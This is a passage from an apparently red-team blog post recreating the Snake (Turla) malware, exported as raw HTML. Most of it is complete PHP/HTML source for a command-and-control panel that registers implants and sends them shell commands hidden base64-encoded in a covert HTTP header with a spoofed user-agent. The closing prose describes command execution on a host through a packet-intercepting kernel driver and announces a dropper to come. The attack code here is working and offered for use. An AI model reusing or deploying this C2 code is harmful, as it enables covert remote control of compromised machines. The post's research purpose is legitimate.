/></span><span class="language-php"><span class="hljs-meta">&lt;?php</span><br /><span class="hljs-title function_ invoke__">session_start</span>();<br /><span class="hljs-comment">// initialize session variable for registered implants</span><br /><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>])) {<br />    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>] = <span class="hljs-keyword">array</span>();<br />    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>], [<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-string">&quot;nickname&quot;</span>,<span class="hljs-string">&quot;ustart&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>]);<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">html_table</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span>{<br />    <span class="hljs-variable">$rows</span> = <span class="hljs-keyword">array</span>();<br />    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) {<br />        <span class="hljs-variable">$cells</span> = <span class="hljs-keyword">array</span>();<br />        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$cell</span>) {<br />            <span class="hljs-variable">$cells</span>[] = <span class="hljs-string">&quot;&lt;td&gt;<span class="hljs-subst">{$cell}</span>&lt;/td&gt;&quot;</span>;<br />        }<br />        <span class="hljs-variable">$rows</span>[] = <span class="hljs-string">&quot;&lt;tr&gt;&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cells</span>) . <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;<br />    }<br />    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;table class=&#x27;hci-table&#x27;&gt;&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$rows</span>) . <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br />}<br /><br /><span class="hljs-comment">//https://stackoverflow.com/questions/3032643/php-get-request-sending-headers</span><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">send_task</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>, <span class="hljs-variable">$url</span>, <span class="hljs-variable">$ustart</span></span>)</span>{<br />    <span class="hljs-variable">$opts</span> = <span class="hljs-keyword">array</span>(<br />        <span class="hljs-string">&#x27;http&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<br />          <span class="hljs-string">&#x27;method&#x27;</span>=&gt;<span class="hljs-string">&quot;GET&quot;</span>,<br />          <span class="hljs-string">&#x27;header&#x27;</span>=&gt;<span class="hljs-string">&quot;Accept-language: en\r\n&quot;</span> .<br />                    <span class="hljs-string">&quot;Cookie: foo=bar\r\n&quot;</span> .<br />                    <span class="hljs-string">&quot;User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n&quot;</span> .<br />                    <span class="hljs-string">&quot;Cache-Auth: &quot;</span> . <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$command</span>) . <span class="hljs-string">&quot;\r\n&quot;</span><br />        )<br />    );<br />      <br />    <span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$opts</span>);<br />    <span class="hljs-keyword">try</span> {<br />        <span class="hljs-comment">// Open the file using the HTTP headers set above</span><br />        <span class="hljs-variable">$file</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span> . <span class="hljs-variable">$ustart</span>, <span class="hljs-literal">false</span>, <span class="hljs-variable">$context</span>);<br />    }<br />    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {<br />        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Message: &#x27;</span> .<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br />    }<br />}<br /><span class="hljs-meta">?&gt;</span></span><span class="language-xml"><br /><br /><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br /><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br /><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;style.css&quot;</span>&gt;</span><br /><br /><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br />    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br />    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br />    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Admin Pannel<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br />   <br /><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br /><br /><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br />    </span><span class="language-php"><span class="hljs-meta">&lt;?php</span><br />    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>])){<br />        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;register&#x27;</span>){<br />            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>], [<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>]), <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;nickname&quot;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;ustart&quot;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>]]);<br />        }<br />        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;task&#x27;</span>){<br />            <span class="hljs-variable">$index</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;index&quot;</span>];<br />            <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>][(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$index</span>][<span class="hljs-number">3</span>];<br />            <span class="hljs-variable">$ustart</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>][(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$index</span>][<span class="hljs-number">2</span>];<br />            <span class="hljs-title function_ invoke__">send_task</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;command&#x27;</span>], <span class="hljs-variable">$url</span>, <span class="hljs-variable">$ustart</span>);<br />            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p style=&#x27;color:red&#x27;&gt;COMMAND SENT&lt;/p&gt;&quot;</span>;<br />        }<br />    }<br />    <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><br />    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br />        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Admin Pannel<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br />        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Stats<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#register&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Register Implant<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Clear Log+Exception<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>DELETE TASK<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />        | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#task&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>TASK<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>CONFIG EDITOR<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Sysinfo<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br />    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br /><br />    <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span><br />        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Implants<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br />        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;register&quot;</span>&gt;</span>Register Implant<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br />        <br />        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;nickname&quot;</span>&gt;</span>Implant nickname:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Fab Frida&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ustart&quot;</span>&gt;</span>Ustart:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ustart&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ustart&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DBEF&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>URL:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://192.168.8.138/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;register&quot;</span>/&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Register Implant&quot;</span>&gt;</span><br />        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br /><br />        <br />        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Active Implants<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br />        </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <br />            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>])) {<br />                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">html_table</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>]);<br />            }<br />        <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><br /><br />        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;task&quot;</span>&gt;</span>Send Task<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br />        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;implant&quot;</span>&gt;</span>Choose implant for task:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br />            </span><span class="language-php"><span class="hljs-meta">&lt;?php</span><br />            <span class="hljs-variable">$row</span> = <span class="hljs-keyword">array</span>();<br />            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;registered_implants_array&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) {<br />                <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;nickname&quot;</span>)){<br />                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;option value=&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&quot;&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&quot; - &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&quot;&lt;/option&gt;&quot;</span>;<br />                }<br />            }<br />            <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><br />            <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;command&quot;</span>&gt;</span>Task command:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;command&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;command&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;task&quot;</span>/&gt;</span><br />            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Task implant&quot;</span>&gt;</span><br />        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br />    <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span><br /><br /><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br /><br /><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></span></pre><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="css" name="d14f" id="d14f" class="graf graf--pre graf-after--pre graf--preV2"><span class="pre--content">// style<span class="hljs-selector-class">.css</span><br /><span class="hljs-selector-tag">body</span> {<br />    <span class="hljs-attribute">background</span>: black;<br />    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">radial-gradient</span>(darkgreen <span class="hljs-number">0.4px</span>, transparent <span class="hljs-number">0</span>);<br />    <span class="hljs-attribute">background-size</span>: <span class="hljs-number">5px</span> <span class="hljs-number">5px</span>;<br />    <span class="hljs-attribute">background-position</span>: -<span class="hljs-number">19px</span> -<span class="hljs-number">19px</span>;<br />    <span class="hljs-attribute">color</span>: green;<br />    <span class="hljs-attribute">width</span>: <span class="hljs-number">800px</span>;<br />    <span class="hljs-attribute">margin</span>: auto;<br />}<br /><span class="hljs-selector-tag">header</span> {<br />    <span class="hljs-attribute">text-align</span>: center;<br />}<br /><span class="hljs-selector-tag">a</span> {<br />    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<br />}<br /><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">td</span>, <span class="hljs-selector-tag">th</span> {<br />    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid;<br />    <span class="hljs-attribute">background-color</span>: lightgray;<br />}<br /><span class="hljs-selector-tag">table</span> {<br />    <span class="hljs-attribute">border-collapse</span>: collapse;<br />    <span class="hljs-attribute">border-color</span>: green;<br />    <span class="hljs-attribute">font-size</span>: medium;<br />    <span class="hljs-attribute">font-family</span>: monospace;<br />    <span class="hljs-attribute">width</span>: <span class="hljs-number">800px</span>;<br />}</span></pre><p name="069a" id="069a" class="graf graf--p graf-after--pre">And our final result in action:</p></div><div class="section-inner sectionLayout--outsetColumn"><figure name="6414" id="6414" class="graf graf--figure graf--layoutOutsetCenter graf-after--p"><img class="graf-image" data-image-id="1*GMtDNTSdiO6H009Z2rN3fw.gif" data-width="1876" data-height="712" src="https://cdn-images-1.medium.com/max/1200/1*GMtDNTSdiO6H009Z2rN3fw.gif"><figcaption class="imageCaption">Execution of command from C2 interface</figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="3a5d" id="3a5d" class="graf graf--p graf-after--figure">A bit of explanation in the gif above, the rightmost PowerShell window is our userland program running and listening for events in the kernel, the middle window is a debug screen for our kernel driver, and the right window is our new custom C2 interface which is used to send a command to the userland application. So we are starting off by running our kernel module using a service on the Windows VM (not shown), next, we register our implant in our “c2” interface, and then we run our userland interface (could also be done directly in the kernel module but that is a story for another day), lastly we execute our command from our “c2” and we get execution on the host.</p><h3 name="3846" id="3846" class="graf graf--h3 graf-after--p">Conclusion</h3><p name="76a3" id="76a3" class="graf graf--p graf-after--h3">And that concludes everything we set out to do in this post, to sum up what we did: we expanded on the WFP part of the kernel driver along with the interaction between userland and kernel to pass communication from the intercepted HTTP packets to our userland program. We also added some basic authentication in the form of the old version of the snake http protocol where bytes in the message are used as credentials.</p><p name="f61b" id="f61b" class="graf graf--p graf-after--p">The project is starting to look more and more like an actual tool instead of a bunch of components. In the next posts, we’ll continue adding more features and develop a dropper!</p><h4 name="17a3" id="17a3" class="graf graf--h4 graf-after--p">Points of improvement</h4><p name="3356" id="3356" class="graf graf--p graf-after--h4">The authentication is still very basic and can be improved to what the CISA refers to as “http2”.</p><ul class="postList"><li name="5826" id="5826" class="graf graf--li graf-after--p">Some more robust error handling might also be nice</li><li name="7fe8" id="7fe8" class="graf graf--li graf-after--li">A more fleshed our C2 interface could also be nice</li><li name="f9d5" id="f9d5" class="graf graf--li graf-after--li">Moving code from the usermode to the kernel could also be cool for authenticity&#39;s sake</li></ul><p name="441e" id="441e" class="graf graf--p graf-after--li">But there is always more that could be done, but let&#39;s not worry too much about that!</p><h3 name="2dda" id="2dda" class="graf graf--h3 graf-after--p">References</h3><ul class="postList"><li name="9a02" id="9a02" class="graf graf--li graf-after--h3">[0] Research on the Ur0bUr0s rootkit: <a href="https://hitcon.org/2014/downloads/E1_05_Paul%20Rascagneres%20-%20Uroburos%20Rootkit.pdf" data-href="https://hitcon.org/2014/downloads/E1_05_Paul%20Rascagneres%20-%20Uroburos%20Rootkit.pdf" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener noopener" target="_blank">https://hitcon.org/2014/downloads/E1_05_Paul%20Rascagneres%20-%20Uroburos%20Rootkit.pdf</a></li><li name="c0ca" id="c0ca" class="graf graf--li graf-after--li">[1] Using WFP to intercept ICMP communication looking for password and embedded command: <a href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" data-href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" class="markup--anchor markup--li-anchor" rel="nofollow noopener noopener" target="_blank">https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2</a></li><li name="204c" id="204c" class="graf graf--li graf-after--li graf--trailing">[2] Details on Turla attacks and malware: <a href="https://securelist.com/the-epic-turla-operation/65545/" data-href="https://securelist.com/the-epic-turla-operation/65545/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://securelist.com/the-epic-turla-operation/65545/</a></li></ul></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@0x0vid" class="p-author h-card">0x0vid</a> on <a href="https://medium.com/p/0c45c785dd91"><time class="dt-published" datetime="2024-01-10T19:49:41.981Z">January 10, 2024</time></a>.</p><p><a href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-003-implementing-covert-communication-using-ustart-0c45c785dd91" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on March 28, 2024.</p></footer></article></body></html>